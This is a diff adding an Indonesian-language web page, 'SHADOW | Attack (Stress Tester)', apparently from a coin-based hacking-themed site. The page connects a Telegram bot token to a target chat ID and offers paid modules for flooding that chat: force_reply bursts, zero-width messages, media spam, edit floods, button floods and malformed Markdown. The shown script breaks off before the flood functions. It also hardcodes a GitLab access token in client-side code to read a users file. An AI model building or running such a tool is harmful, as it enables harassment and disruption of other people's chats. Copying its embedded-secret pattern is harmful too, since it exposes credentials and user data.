@@ -1,0 +1,1239 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SHADOW | Attack (Stress Tester)</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    
+    <style>
+        /* --- CSS INTI (Sidebar, Modal, Tombol) --- */
+        :root {
+            --bg-color: #0d0d0d;
+            --container-bg: rgba(26, 26, 26, 0.9);
+            --input-bg: #222222;
+            --border-color: #333;
+            --text-color: #e0e0e0;
+            --primary-color: #ffffff;
+            --primary-glow: rgba(255, 255, 255, 0.3);
+            --success-color: #2ecc71;
+            --danger-color: #e74c3c;
+            --coin-color: #f1c40f; 
+            --sidebar-width: 250px; 
+            --border-radius-main: 16px;
+            --border-radius-small: 8px;
+            --border-radius-pill: 50px;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-color); color: var(--text-color);
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh; overflow-x: hidden; flex-direction: column;
+            transition: margin-left 0.3s ease, font-family 0.3s ease; 
+        }
+        #sidebar {
+            position: fixed; top: 0; left: 0; height: 100%;
+            width: var(--sidebar-width); background-color: rgba(10, 10, 10, 0.95);
+            padding-top: 60px; box-shadow: 2px 0 10px rgba(0, 0, 0, 0.5);
+            transform: translateX(-100%); transition: transform 0.3s ease;
+            z-index: 100; backdrop-filter: blur(5px); overflow-y: auto;
+        }
+        #sidebar.open { transform: translateX(0); }
+        .menu-header {
+            position: absolute; top: 0; left: 0; width: 100%;
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 10px 20px; background: #111; z-index: 101;
+        }
+        .menu-header h3 { color: var(--primary-color); margin: 0; font-size: 1.2rem; border-bottom: none; }
+        .menu-header button { width: auto; padding: 5px 10px; text-transform: none; background: #333; color: #fff; border:none; cursor: pointer; }
+        .sidebar-nav a, .sidebar-nav button {
+            display: block; width: 100%; text-align: left; padding: 15px 20px;
+            text-decoration: none; color: var(--text-color); background: none;
+            border: none; cursor: pointer; font-size: 1rem;
+            transition: background-color 0.3s, color 0.3s; position: relative;
+        }
+        .sidebar-nav a:hover, .sidebar-nav button:hover, .sidebar-nav a.active {
+            background-color: var(--primary-color); color: var(--bg-color);
+        }
+        .sidebar-nav a.active { font-weight: bold; }
+        .sidebar-nav a i, .sidebar-nav button i { margin-right: 10px; }
+        .sidebar-close {
+            position: absolute; right: 10px; top: 50%; transform: translateY(-50%);
+            font-size: 0.8rem; color: #aaa; opacity: 0; transition: opacity 0.2s;
+        }
+        .sidebar-nav button:hover .sidebar-close, .sidebar-nav a:hover .sidebar-close { opacity: 1; }
+        #menu-toggle, #settings-toggle {
+            position: fixed; top: 20px; z-index: 102;
+            border: none; padding: 10px 15px; border-radius: var(--border-radius-small);
+            font-size: 1.2rem; cursor: pointer; transition: all 0.3s; width: auto; display: none;
+        }
+        #menu-toggle { left: 20px; background: var(--primary-color); color: var(--bg-color); box-shadow: 0 0 10px var(--primary-glow); }
+        #settings-toggle { right: 20px; background: #222; color: var(--primary-color); border: 1px solid var(--border-color); box-shadow: 0 0 10px rgba(0,0,0,0.5); }
+        #sidebar-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); z-index: 99; display: none; }
+        .container {
+            width: 90%; max-width: 900px;
+            background-color: var(--container-bg);
+            border-radius: var(--border-radius-main); padding: 2rem;
+            margin: 2rem 0; z-index: 10; backdrop-filter: blur(10px);
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.8); border: 1px solid var(--border-color);
+        }
+        .page { display: none; }
+        h1 {
+            font-size: 2.5rem; font-weight: bold; letter-spacing: 2px;
+            background: linear-gradient(90deg, #888, #fff, #888, #fff);
+            background-size: 200% auto; color: transparent;
+            -webkit-background-clip: text; background-clip: text;
+            animation: text-shine 5s linear infinite;
+            text-align: center; margin-bottom: 0.5rem;
+        }
+        @keyframes text-shine { to { background-position: -200% center; } }
+        h2 { font-size: 1.8rem; color: var(--primary-color); text-align: center; margin-bottom: 1.5rem; }
+        h3 { font-size: 1.4rem; color: var(--text-color); border-bottom: 1px solid var(--primary-color); padding-bottom: 5px; margin-bottom: 1rem; }
+        button {
+            width: 100%; padding: 0.8rem; font-size: 1rem; border-radius: var(--border-radius-pill);
+            background-color: var(--primary-color); color: #000; font-weight: bold;
+            border: none; cursor: pointer; text-transform: uppercase; letter-spacing: 1px;
+            transition: all 0.3s ease; position: relative; font-family: inherit;
+        }
+        button:hover { box-shadow: 0 0 15px var(--primary-glow); filter: brightness(1.2); transform: translateY(-2px); }
+        button:disabled { background-color: #555; color: #999; cursor: not-allowed; box-shadow: none; transform: none; }
+        button.secondary { background-color: transparent; border: 1px solid var(--primary-color); color: var(--primary-color); }
+        button.secondary:hover { background-color: var(--primary-color); color: #000; }
+        button.danger { background-color: var(--danger-color); border-color: var(--danger-color); color: white; }
+        
+        .coin-balance-display {
+            text-align: center; font-size: 1.3rem; font-weight: 700;
+            color: var(--coin-color); text-shadow: 0 0 10px rgba(241, 196, 15, 0.5);
+            margin: 0.5rem auto 1.5rem auto; padding: 10px;
+            background: rgba(0,0,0,0.3); border-radius: var(--border-radius-pill);
+            border: 1px solid var(--coin-color); max-width: 300px;
+            transition: all 0.3s ease;
+        }
+        .coin-balance-display i { margin-right: 10px; }
+        
+        #modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.7); z-index: 199;
+            display: none; opacity: 0; transition: opacity 0.3s ease;
+        }
+        #settings-modal, .game-modal {
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0.95);
+            width: 90%; max-width: 500px; max-height: 90vh;
+            overflow-y: auto;
+            background: var(--container-bg); border-radius: var(--border-radius-main);
+            border: 1px solid var(--border-color); box-shadow: 0 0 30px rgba(0,0,0,0.8);
+            z-index: 200; display: none; opacity: 0; transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+        #settings-modal.open, .game-modal.open, #modal-overlay.open { display: block; opacity: 1; }
+        #settings-modal.open, .game-modal.open { transform: translate(-50%, -50%) scale(1); }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; padding: 1rem 1.5rem; border-bottom: 1px solid var(--border-color); }
+        .modal-header h2 { margin: 0; font-size: 1.5rem; }
+        .modal-header button { width: auto; padding: 5px 10px; background: transparent; color: var(--text-color); border: none; font-size: 1.5rem; cursor: pointer; }
+        .modal-body { padding: 1.5rem; }
+        .setting-group { margin-bottom: 1.5rem; }
+        .setting-group h3 { font-size: 1.1rem; color: var(--primary-color); border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem; margin-bottom: 1rem; }
+        .setting-item { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; }
+        .setting-item label { margin: 0; font-size: 1rem; }
+        .toggle-switch { position: relative; display: inline-block; width: 50px; height: 28px; }
+        .toggle-switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #333; transition: .4s; border-radius: 34px; }
+        .slider:before { position: absolute; content: ""; height: 20px; width: 20px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background-color: var(--primary-color); }
+        input:checked + .slider:before { background-color: #000; transform: translateX(22px); }
+        canvas#stars { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; pointer-events: none; }
+        body.stars-hidden canvas#stars { display: none; }
+        footer.dev-contact { text-align: center; margin-top: 2rem; padding-top: 1rem; border-top: 1px solid var(--border-color); font-size: 0.9rem; color: #888; }
+        .notification {
+            text-align: center; padding: 0.8rem; margin-bottom: 1rem;
+            border-radius: var(--border-radius-small); display: none;
+            font-size: 0.9rem; border: 1px solid;
+        }
+        .notification.success { background-color: #0f3d1b; color: #8affab; border-color: #1a7431; }
+        .notification.error { background-color: #3d0f0f; color: #ffa8a8; border-color: #741a1a; }
+        .notification.info { background-color: #0f2a3d; color: #a8dfff; border-color: #1a5674; }
+        
+        /* --- (DIMODIFIKASI) CSS KHUSUS ATTACK (Mobile-First 9:16) --- */
+        
+        .styled-card {
+            background: var(--input-bg);
+            border: 1px solid var(--border-color);
+            border-radius: var(--border-radius-main);
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+        
+        .form-group { margin-bottom: 1rem; }
+        .form-group label { display: block; margin-bottom: 0.5rem; font-size: 0.9rem; color: #aaa; }
+        
+        input[type="text"], input[type="password"], input[type="number"], select {
+            width: 100%; padding: 0.8rem; font-size: 1rem;
+            border-radius: var(--border-radius-small); border: 1px solid var(--border-color);
+            background-color: #111; color: var(--text-color);
+            transition: all 0.3s ease; font-family: inherit;
+        }
+        input[type="text"]:focus, input[type="password"]:focus, input[type="number"]:focus, select:focus {
+            outline: none; border-color: var(--primary-color);
+            box-shadow: 0 0 10px var(--primary-glow);
+        }
+        
+        .checkbox-group {
+            display: flex; align-items: center; gap: 0.5rem;
+            color: #aaa; cursor: pointer; margin-top: 1rem;
+        }
+        .checkbox-group input { width: auto; }
+        .checkbox-group label { margin: 0; font-size: 1rem; color: #aaa; }
+        
+        /* (DIMODIFIKASI) Grid untuk 9:16 (Mobile) */
+        .test-modules-grid {
+            display: grid;
+            grid-template-columns: 1fr; /* 1 kolom untuk 9:16 (default) */
+            gap: 1.5rem;
+        }
+        
+        .attack-card {
+            background: #111;
+            border-radius: var(--border-radius-main);
+            border: 1px solid var(--border-color);
+            padding: 1.5rem;
+            text-align: center;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            opacity: 0; /* Untuk animasi */
+            transform: translateY(20px); /* Untuk animasi */
+            position: relative;
+            overflow: hidden;
+        }
+        .attack-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 0 20px var(--primary-glow);
+            border-color: var(--primary-color);
+        }
+        .attack-card i { font-size: 3rem; color: var(--primary-color); margin-bottom: 1rem; }
+        .attack-card h3 { font-size: 1.2rem; color: var(--text-color); border: none; padding: 0; margin-bottom: 0.5rem; }
+        .attack-card p { font-size: 0.9rem; color: #aaa; margin-bottom: 1rem; }
+        
+        /* (BARU) Badge Biaya Koin */
+        .attack-card-cost {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: var(--coin-color);
+            color: #000;
+            font-size: 0.8rem;
+            font-weight: bold;
+            padding: 4px 8px;
+            border-radius: var(--border-radius-pill);
+            box-shadow: 0 0 10px rgba(241, 196, 15, 0.5);
+        }
+        .attack-card-cost i {
+            font-size: 0.8rem;
+            margin: 0;
+            margin-right: 3px;
+            color: #000;
+        }
+        
+        .modal-cost {
+            font-size: 1.2rem; font-weight: bold; color: var(--coin-color);
+            margin: 1rem 0; padding: 0.5rem; background: #111;
+            border-radius: var(--border-radius-small); border: 1px solid var(--coin-color);
+        }
+        .modal-cost i { font-size: 1rem; }
+        
+        /* (BARU) Kartu Kontak Developer (dari index.html) */
+        .dev-contact-card {
+            text-align: center;
+            padding: 2rem;
+        }
+        .dev-contact-card img {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            border: 3px solid var(--primary-color);
+            box-shadow: 0 0 15px var(--primary-glow);
+            margin-bottom: 1rem;
+        }
+        .dev-name { font-weight: bold; color: var(--text-color); font-size: 1.3rem; }
+        .dev-role { font-size: 1rem; color: #aaa; margin-bottom: 1.5rem; }
+        .dev-links { display: flex; justify-content: center; gap: 1rem; flex-wrap: wrap; }
+        .dev-links a {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.75rem;
+            padding: 0.75rem 1rem;
+            border-radius: var(--border-radius-pill);
+            text-decoration: none;
+            font-weight: 700;
+            transition: all 0.3s ease;
+            color: #fff;
+            width: 150px;
+        }
+        .dev-links a i { font-size: 1.2rem; margin: 0; }
+        .dev-links a.telegram { background: #2AABEE; }
+        .dev-links a.whatsapp { background: #25D366; }
+        .dev-links a:hover { transform: translateY(-3px); filter: brightness(1.2); }
+        
+        /* (BARU) Animasi Stagger */
+        @keyframes fadeInUp {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        /* (DIMODIFIKASI) Media Query untuk 9:16 (Mobile) & Desktop */
+        @media (max-width: 900px) {
+            body { margin-left: 0; }
+            #menu-toggle, #settings-toggle { display: block; }
+            .container { width: 95%; padding: 1.5rem; } /* Lebih pas di 9:16 */
+            h1 { font-size: 2rem; }
+        }
+        
+        /* (DIMODIFIKASI) Saat layar lebar (bukan 9:16), buat 2 kolom */
+        @media (min-width: 768px) {
+            .test-modules-grid {
+                grid-template-columns: 1fr 1fr; /* 2 kolom di tablet/desktop */
+            }
+        }
+    </style>
+</head>
+<body class="stars-hidden"> <canvas id="stars"></canvas>
+
+    <div id="splash-screen" style="display: none;"></div>
+    
+    <audio id="bg-music" loop>
+        <source src="https://files.catbox.moe/exgp8t.mp4" type="audio/mpeg">
+    </audio>
+    
+    <button id="menu-toggle"><i class="fas fa-bars"></i></button>
+    <button id="settings-toggle"><i class="fas fa-cog"></i></button>
+    <div id="sidebar-overlay"></div>
+    
+    <div id="sidebar">
+        <div class="menu-header">
+            <h3>NAVIGASI</h3>
+            <button class="secondary" id="sidebar-close-btn"><i class="fas fa-times"></i></button>
+        </div>
+        <nav class="sidebar-nav">
+            <a href="index.html" class="tab-link"><i class="fas fa-satellite-dish"></i> LOBBY <span class="sidebar-close">x</span></a>
+            <a href="attack.html" class="tab-link active"><i class="fas fa-bolt"></i> ATTACK <span class="sidebar-close">x</span></a>
+            <a href="store.html" class="tab-link"><i class="fas fa-store"></i> STORE <span class="sidebar-close">x</span></a>
+            <a href="missions.html" class="tab-link"><i class="fas fa-tasks"></i> MISI <span class="sidebar-close">x</span></a>
+            <a href="profile.html" class="tab-link"><i class="fas fa-user-astronaut"></i> PROFILE <span class="sidebar-close">x</span></a>
+            <a href="ai.html" class="tab-link"><i class="fas fa-robot"></i> AI CHAT <span class="sidebar-close">x</span></a>
+            <a href="quotes.html" class="tab-link"><i class="fas fa-feather-alt"></i> QUOTES GEN <span class="sidebar-close">x</span></a>
+            <a href="logs.html" class="tab-link"><i class="fas fa-history"></i> LOGS <span class="sidebar-close">x</span></a>
+            <a href="tools.html" class="tab-link" id="tools-tab-button" style="display: none;"><i class="fas fa-tools"></i> TOOLS <span class="sidebar-close">x</span></a>
+            <a href="game.html" class="tab-link"><i class="fas fa-gamepad"></i> GAME HUB <span class="sidebar-close">x</span></a>
+            <a href="admin.html" class="tab-link" id="admin-tab-button" style="display: none;"><i class="fas fa-user-cog"></i> ADMIN <span class="sidebar-close">x</span></a>
+            <button id="sidebar-settings-button" class="tab-link"><i class="fas fa-cog"></i> SETTINGS <span class="sidebar-close">x</span></button>
+        </nav>
+        <footer class="dev-contact" style="position: absolute; bottom: 10px; width: 100%; background: #111; padding: 10px 0;">
+            <p>v3.2 (Attack) by zexxo.</p>
+        </footer>
+    </div>
+
+    <div id="attack-page" class="container page" style="display: none;">
+        <h1><i class="fas fa-bolt"></i> Stress Tester</h1>
+        
+        <div class="coin-balance-display">
+            <i class="fas fa-coins"></i> <span id="user-coin-balance">...</span> Coins
+        </div>
+        
+        <div id="attack-notification" class="notification"></div>
+        
+        <div class="styled-card" id="connection-card">
+            <h3><i class="fas fa-satellite-dish"></i> Koneksi Bot</h3>
+            
+            <div id="connect-form">
+                <div class="form-group">
+                    <label for="bot-token-input">Bot Token</label>
+                    <input type="password" id="bot-token-input" placeholder="123456:ABC-DEF...">
+                </div>
+                <div class="form-group">
+                    <label for="chat-id-input">Target Chat ID</label>
+                    <input type="text" id="chat-id-input" placeholder="-100123456789 (termasuk -)">
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="remember-session">
+                    <label for="remember-session">Ingat Sesi</label>
+                </div>
+                <button class="secondary" id="btn-connect" style="margin-top: 1.5rem;">Connect</button>
+            </div>
+            
+            <div id="connected-info" style="display:none; align-items: center; justify-content: space-between;">
+                <span id="bot-username" style="font-size: 1.2rem; font-weight: 700; color: var(--success-color);">Connected: @botusername</span>
+                <button class="danger" id="btn-disconnect" style="width: auto; padding: 0.6rem 1.2rem;">Disconnect</button>
+            </div>
+        </div>
+
+        <div class="styled-card" id="test-modules" style="display:none;">
+            <h3><i class="fas fa-vial"></i> Modul Tes</h3>
+            <p style="color: #aaa; font-size: 0.9rem; margin-top: -0.5rem; margin-bottom: 1.5rem;">
+                Setiap tes memerlukan biaya untuk dijalankan. Pastikan koin Anda cukup.
+            </p>
+            
+            <div class="test-modules-grid">
+                <div class="attack-card" data-modal-id="overload" data-cost="50">
+                    <div class="attack-card-cost"><i class="fas fa-coins"></i> 50</div>
+                    <i class="fas fa-bomb"></i>
+                    <h3>Overload Sim</h3>
+                    <p>Mengirim 3 pesan <code>force_reply</code> beruntun.</p>
+                </div>
+                <div class="attack-card" data-modal-id="invisible" data-cost="50">
+                    <div class="attack-card-cost"><i class="fas fa-coins"></i> 50</div>
+                    <i class="fas fa-ghost"></i>
+                    <h3>Invisible Test</h3>
+                    <p>Mengirim 5 pesan 'zero-width' bersamaan.</p>
+                </div>
+                <div class="attack-card" data-modal-id="broadcast" data-cost="50">
+                    <div class="attack-card-cost"><i class="fas fa-coins"></i> 50</div>
+                    <i class="fas fa-broadcast-tower"></i>
+                    <h3>Freq Broadcast</h3>
+                    <p>Tes rate-limit (10 pesan, delay 500ms).</p>
+                </div>
+                <div class="attack-card" data-modal-id="button_flood" data-cost="75">
+                    <div class="attack-card-cost"><i class="fas fa-coins"></i> 75</div>
+                    <i class="fas fa-table-cells"></i>
+                    <h3>Button Flood</h3>
+                    <p>Mengirim pesan dengan 25 tombol inline.</p>
+                </div>
+                <div class="attack-card" data-modal-id="media_spam" data-cost="100">
+                    <div class="attack-card-cost"><i class="fas fa-coins"></i> 100</div>
+                    <i class="fas fa-images"></i>
+                    <h3>Media Spam</h3>
+                    <p>Mengirim 3 gambar secara beruntun.</p>
+                </div>
+                <div class="attack-card" data-modal-id="edit_flood" data-cost="75">
+                    <div class="attack-card-cost"><i class="fas fa-coins"></i> 75</div>
+                    <i class="fas fa-pencil-alt"></i>
+                    <h3>Edit Flood</h3>
+                    <p>Mengedit 1 pesan sebanyak 5 kali.</p>
+                </div>
+                 <div class="attack-card" data-modal-id="markdown_inject" data-cost="100">
+                    <div class="attack-card-cost"><i class="fas fa-coins"></i> 100</div>
+                    <i class="fab fa-markdown"></i>
+                    <h3>Markdown Inject</h3>
+                    <p>Mengirim format Markdown/HTML "rusak".</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="styled-card dev-contact-card">
+            <img src="https://files.catbox.moe/fh8u76.jpg" alt="zexxo">
+            <div class="dev-name">zexxo / aldo</div>
+            <div class="dev-role">Lead Developer</div>
+            <div class="dev-links">
+                <a href="https://t.me/zexhama" target="_blank" class="telegram">
+                    <i class="fab fa-telegram"></i> Telegram
+                </a>
+                <a href="https://wa.me/6283120271790" target="_blank" class="whatsapp">
+                    <i class="fab fa-whatsapp"></i> WhatsApp
+                </a>
+            </div>
+        </div>
+        
+    </div>
+    
+    
+    <div id="modal-overlay"></div>
+    <div id="settings-modal">
+        <div class="modal-header">
+            <h2>Settings</h2>
+            <button class="modal-close-btn"><i class="fas fa-times"></i></button>
+        </div>
+        <div class="modal-body">
+            <div class="setting-group">
+                <h3><i class="fas fa-paint-brush"></i> Tampilan</h3>
+                <div class="setting-item">
+                    <label for="setting-accent-color">Warna Aksen</label>
+                    <select id="setting-accent-color" name="setting-accent-color">
+                        <option value="#ffffff">Default (Putih)</option>
+                        <option value="#3498db">Biru</option>
+                        <option value="#2ecc71">Hijau</option>
+                        <option value="#e74c3c">Merah</option>
+                        <option value="#cccccc">Abu-abu</option>
+                    </select>
+                </div>
+                <div class="setting-item">
+                    <label for="setting-font-size">Ukuran Font</label>
+                    <select id="setting-font-size" name="setting-font-size">
+                        <option value="14px">Kecil</option>
+                        <option value="16px">Normal</option>
+                        <option value="18px">Besar</option>
+                    </select>
+                </div>
+                <div class="setting-item">
+                    <label for="setting-font-family">Gaya Font</label>
+                    <select id="setting-font-family" name="setting-font-family">
+                        <option value="'Segoe UI', Tahoma, Geneva, Verdana, sans-serif">Default (Segoe UI)</option>
+                        <option value="'Roboto', sans-serif">Roboto</option>
+                        <option value="'Courier New', Courier, monospace">Monospace</option>
+                    </select>
+                </div>
+                 <div class="setting-item">
+                    <label for="setting-text-glow">Teks Glow</label>
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="setting-text-glow">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="setting-item">
+                    <label for="setting-stars">Animasi Bintang</label>
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="setting-stars">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+            <div class="setting-group">
+                <h3><i class="fas fa-volume-up"></i> Audio & Feedback</h3>
+                 <div class="setting-item">
+                    <label for="setting-music-toggle">Musik Latar</label>
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="setting-music-toggle">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="setting-item">
+                    <label for="setting-music-volume">Volume</label>
+                    <input type="range" id="setting-music-volume" min="0" max="1" step="0.1">
+                </div>
+                <div class="setting-item">
+                    <label for="setting-vibration">Vibrasi Tombol (HP)</label>
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="setting-vibration">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+             <div class="setting-group">
+                <h3><i class="fas fa-cog"></i> Sistem</h3>
+                 <div class="setting-item">
+                    <label for="setting-dev-mode">Mode Developer</label>
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="setting-dev-mode">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                 <div class="setting-item">
+                    <label for="setting-skip-splash">Lewati Splash Screen</label>
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="setting-skip-splash">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="setting-item">
+                    <label>Hapus Cache Pengaturan</label>
+                    <button class="secondary" id="setting-clear-cache" style="width: auto; padding: 5px 10px; font-size: 0.9rem; border-radius: var(--border-radius-pill);">Reset</button>
+                </div>
+                 <div class="setting-item">
+                    <label>Logout dari Akun</label>
+                    <button class="danger" id="setting-logout-button" style="width: auto; padding: 5px 10px; font-size: 0.9rem; border-radius: var(--border-radius-pill);">Logout</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div id="test-modal" class="game-modal">
+        <div class="modal-header">
+            <h2 id="modal-title">Konfirmasi Tes</h2>
+            <button class="modal-close-btn"><i class="fas fa-times"></i></button>
+        </div>
+        <div class="modal-body" id="modal-body-content" style="text-align: center;">
+            <p id="modal-description">Ini akan mengirim 3 pesan...</p>
+        </div>
+        <div class="modal-body" style="padding-top: 0;">
+            <div class="modal-cost">
+                Biaya: <i class="fas fa-coins"></i> <span id="modal-cost-amount">50</span> Koin
+            </div>
+            <div style="display: flex; gap: 1rem; justify-content: flex-end;">
+                <button class="secondary modal-close-btn" style="width: 120px;">Batal</button>
+                <button class="danger" id="modal-confirm-btn" style="width: 150px;">Lanjutkan</button>
+            </div>
+        </div>
+    </div>
+
+
+    <script>
+        // --- PENGATURAN GITLAB (LENGKAP) ---
+        const GITLAB_TOKEN = 'glpat-9cZaOPR0hBHj-qiqIqzT9W86MQp1Omlsc2xiCw.01.120onr34s';
+        const GITLAB_PROJECT_ID = '75681438';
+        const GITLAB_BRANCH = 'main';
+        
+        const USERS_FILE = 'users.json';
+        const GITLAB_BASE_URL = `https://gitlab.com/api/v4/projects/${GITLAB_PROJECT_ID}/repository/files/`;
+        const GITLAB_USERS_URL = `${GITLAB_BASE_URL}${encodeURIComponent(USERS_FILE)}`;
+        // --- AKHIR PENGATURAN GITLAB ---
+
+        // --- DOM Elements (Global) ---
+        const attackPage = document.getElementById('attack-page');
+        const sidebar = document.getElementById('sidebar');
+        const sidebarOverlay = document.getElementById('sidebar-overlay');
+        const menuToggle = document.getElementById('menu-toggle');
+        const sidebarCloseBtn = document.getElementById('sidebar-close-btn');
+        const toolsTabButton = document.getElementById('tools-tab-button');
+        const settingsToggle = document.getElementById('settings-toggle');
+        const sidebarSettingsButton = document.getElementById('sidebar-settings-button');
+        const modalOverlay = document.getElementById('modal-overlay');
+        const settingsModal = document.getElementById('settings-modal');
+        const settingsModalCloseBtn = document.querySelector('#settings-modal .modal-close-btn');
+        const bgMusic = document.getElementById('bg-music');
+        const globalUserCoinBalance = document.getElementById('user-coin-balance');
+        const attackNotification = document.getElementById('attack-notification');
+        
+        let USER_INFO = null;
+        let SETTINGS = {};
+        let activeGameLoop = null; 
+        
+        // --- DOM Elemen Tester ---
+        const connectForm = document.getElementById('connect-form');
+        const connectedInfo = document.getElementById('connected-info');
+        const testModules = document.getElementById('test-modules');
+        const botTokenInput = document.getElementById('bot-token-input');
+        const chatIdInput = document.getElementById('chat-id-input');
+        const rememberSession = document.getElementById('remember-session');
+        const botUsernameSpan = document.getElementById('bot-username');
+        const btnConnect = document.getElementById('btn-connect');
+        const btnDisconnect = document.getElementById('btn-disconnect');
+        
+        // --- DOM Modal Tester ---
+        const testModal = document.getElementById('test-modal');
+        const modalTitle = document.getElementById('modal-title');
+        const modalDescription = document.getElementById('modal-description');
+        const modalCostAmount = document.getElementById('modal-cost-amount');
+        const modalConfirmBtn = document.getElementById('modal-confirm-btn');
+        
+        // --- Variabel Tester ---
+        let botToken = null;
+        let chatId = null;
+        
+
+        // --- Fungsi Navigasi Sidebar & Modal ---
+        function openSidebar() { sidebar.classList.add('open'); sidebarOverlay.style.display = 'block'; if (window.innerWidth > 900) { document.body.style.marginLeft = 'var(--sidebar-width)'; } }
+        function closeSidebar() { sidebar.classList.remove('open'); sidebarOverlay.style.display = 'none'; document.body.style.marginLeft = '0'; }
+        function openSettingsModal() { vibrate(); settingsModal.classList.add('open'); modalOverlay.classList.add('open'); }
+        function closeSettingsModal() { settingsModal.classList.remove('open'); modalOverlay.classList.remove('open'); }
+        menuToggle.addEventListener('click', () => { vibrate(); openSidebar(); });
+        sidebarOverlay.addEventListener('click', () => { closeSidebar(); closeGameModals(); modalOverlay.classList.remove('open'); });
+        sidebarCloseBtn.addEventListener('click', closeSidebar);
+        settingsToggle.addEventListener('click', openSettingsModal);
+        sidebarSettingsButton.addEventListener('click', () => { closeSidebar(); openSettingsModal(); });
+        if(settingsModalCloseBtn) settingsModalCloseBtn.addEventListener('click', closeSettingsModal);
+        
+        function closeGameModals() { document.querySelectorAll('.game-modal').forEach(modal => modal.classList.remove('open')); }
+        document.querySelectorAll('.game-modal .modal-close-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                closeGameModals();
+                modalOverlay.classList.remove('open');
+            });
+        });
+        
+        // --- Fungsi Utilitas Tester ---
+        function showNotification(id, message, type) {
+            const el = document.getElementById(id);
+            if (!el) return;
+            el.textContent = message;
+            el.className = 'notification ' + type;
+            el.style.display = 'block';
+        }
+        function hideAllNotifications() { document.querySelectorAll('.notification').forEach(el => el.style.display = 'none'); }
+        function disableButton(btn, text) {
+            if (!btn) return; 
+            btn.disabled = true;
+            btn.setAttribute('data-original-text', btn.textContent);
+            btn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${text || ''}`; 
+        }
+        function enableButton(btn, text) {
+            if (!btn) return; 
+            const originalText = btn.getAttribute('data-original-text');
+            btn.innerHTML = text || originalText || "Button";
+            btn.disabled = false;
+        }
+        const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+        
+        
+        // --- Logika Modal Tes & Koin ---
+        const modalConfigs = {
+            overload: {
+                title: 'Konfirmasi: Overload Sim',
+                description: 'Ini akan mengirim 3 pesan "SYSTEM OVERLOAD" dengan <code>force_reply</code> ke Chat ID target.',
+                callback: (btn) => simulateOverload(btn)
+            },
+            invisible: {
+                title: 'Konfirmasi: Invisible Test',
+                description: 'Ini akan mengirim 5 pesan "zero-width" (tak terlihat) secara bersamaan.',
+                callback: (btn) => simulateInvisibleFlood(btn)
+            },
+            broadcast: {
+                title: 'Konfirmasi: Freq Broadcast',
+                description: 'Tes rate-limit (10 pesan, delay 500ms).',
+                callback: (btn) => simulateHighFreqBroadcast(btn, 10, 500)
+            },
+            button_flood: {
+                title: 'Konfirmasi: Button Flood',
+                description: 'Mengirim 1 pesan dengan 25 tombol inline untuk menguji render client.',
+                callback: (btn) => simulateButtonFlood(btn)
+            },
+            media_spam: {
+                title: 'Konfirmasi: Media Spam',
+                description: 'Mengirim 3 gambar acak secara beruntun.',
+                callback: (btn) => simulateMediaSpam(btn)
+            },
+            edit_flood: {
+                title: 'Konfirmasi: Edit Flood',
+                description: 'Mengirim 1 pesan lalu mengeditnya 5x dengan cepat.',
+                callback: (btn) => simulateEditFlood(btn)
+            },
+            markdown_inject: {
+                title: 'Konfirmasi: Markdown Inject',
+                description: 'Mengirim 1 pesan dengan format MarkdownV2 yang "rusak".',
+                callback: (btn) => simulateMarkdownInject(btn)
+            }
+        };
+        
+        let currentTestCallback = null;
+        let currentTestCost = 0;
+        
+        document.querySelectorAll('.attack-card').forEach(card => {
+            card.addEventListener('click', () => {
+                const modalId = card.dataset.modalId;
+                const cost = parseInt(card.dataset.cost, 10);
+                const config = modalConfigs[modalId];
+                if (!config) return;
+                
+                vibrate();
+                
+                modalTitle.textContent = config.title;
